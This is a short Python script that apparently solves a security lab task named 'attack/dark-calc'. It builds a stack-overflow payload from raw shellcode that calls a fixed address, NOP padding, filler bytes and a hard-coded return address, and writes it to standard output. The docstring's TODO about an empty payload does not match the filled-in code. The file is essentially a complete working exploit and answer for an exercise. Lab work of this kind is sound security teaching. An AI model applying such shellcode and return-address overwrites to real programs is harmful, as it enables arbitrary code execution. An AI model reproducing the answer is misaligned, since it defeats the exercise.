#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
shellcode = bytes.fromhex(
    "bf 04 00 00 00"
    "b8 87 1a 40 00"
    "ff d0"
    "eb fe"
)
payload = shellcode
payload += b"\x90" * (16 - len(shellcode))
payload += b"A" * 8
payload += (0x721000800fd0).to_bytes(8, 'little')
sys.stdout.buffer.write(payload + b"\n")
